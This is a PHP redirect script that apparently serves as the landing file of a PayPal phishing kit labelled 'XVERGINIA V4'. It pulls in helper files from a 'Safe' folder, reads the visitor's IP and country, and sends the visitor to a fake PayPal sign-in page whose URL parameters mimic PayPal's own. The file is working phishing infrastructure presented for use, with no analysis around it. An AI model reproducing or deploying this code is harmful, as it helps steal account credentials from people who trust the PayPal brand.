<?php
/*   
   
                              #=======================#
                              #    XVERGINIA V4       #
                              #=======================#
							  
							  
*/


session_start();
error_reporting(0);
include('./functions/get_ip.php');
include('myaccount/Safe/xanbbx.php');
include('functions/Config.php');
include('myaccount/Safe/get_lg.php');
include('myaccount/Safe/XYSRNX.php');
// PAYPAL XVERGINIA V.3.1
if(isset($_SESSION['xcountryCodex'])){
		if($login_theme == "new"){
			$xDIRx = "myaccount/Sign-in/?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
		else if($login_theme == "old") {
			$xDIRx = "myaccount/signin/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."";
		}
		else {
			die("<h2>You have made a mistake in a file 'config.php', please correct the error in variable login_theme</h2");
		}
	}
	else {
		if($login_theme == "new"){
			$xDIRx = "myaccount/Sign-in/?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2;
		}
		else if($login_theme == "old") {
			$xDIRx = "myaccount/signin/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."";
		}
		else {
			die("<h2>You have made a mistake in a file 'config.php', please correct the error in variable login_theme</h2");
		}
	}
?>
<html>
	<head>
		<meta http-equiv="refresh" content="0; URL=<?php echo $xDIRx ?>" />
	</head>
</html>

